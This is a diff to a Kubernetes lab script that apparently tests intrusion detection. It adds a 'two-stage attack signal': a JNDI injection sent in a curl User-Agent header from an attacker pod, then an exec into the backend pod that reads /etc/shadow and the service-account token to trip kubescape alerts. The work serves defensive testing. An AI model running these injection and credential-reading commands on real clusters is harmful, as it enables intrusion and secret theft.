@@ -39,7 +39,16 @@ for i in $(seq 1 6); do kubectl -n $NS delete pod cl-$i --ignore-not-found --wai
 for i in $(seq 1 6); do kubectl -n $NS run cl-$i --image=busybox:1.36 --labels=run=cldx --restart=Never -- \
   sh -c "while true; do wget -qO- http://$FE:$FEP/api/products?q=l$i >/dev/null 2>&1; done" >/dev/null 2>&1; done
 
-fire(){ kubectl -n attacker-ns exec deploy/attacker -- curl -s -m4 -A "$JNDI" "http://$BIP:$BPORT/api/products" >/dev/null 2>&1 || true; }
+# Two-stage attack signal. Stage-1 (JNDI/LDAP) alone does NOT make kubescape flag
+# the backend → DX gets no case → no steer. The R0001/R0006 that DX rules on come
+# from stage-2 (post-exploitation exec). Fire BOTH so DX rules the backend
+# MALIGNANT and it enters AE's activeSet. (Learned the hard way: JNDI-only = no
+# R0001 = DX indeterminate; cf. SHELLS_CAPTURE_RCA / lab redis exfil example.)
+fire(){
+  kubectl -n attacker-ns exec deploy/attacker -- curl -s -m4 -A "$JNDI" "http://$BIP:$BPORT/api/products" >/dev/null 2>&1 || true
+  local bp; bp=$(kubectl -n "$NS" get pods --no-headers 2>/dev/null | awk '/^backend/{print $1;exit}')
+  [ -n "$bp" ] && kubectl -n "$NS" exec "$bp" -- sh -c 'whoami; cat /etc/shadow 2>&1 | head -1; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 10; getent hosts attacker.attacker-ns.svc.cluster.local' >/dev/null 2>&1 || true
+}
 
 run_arm(){ local name="$1"; shift
   echo "=== ARM $name: $* ===" | tee -a "$OUT"
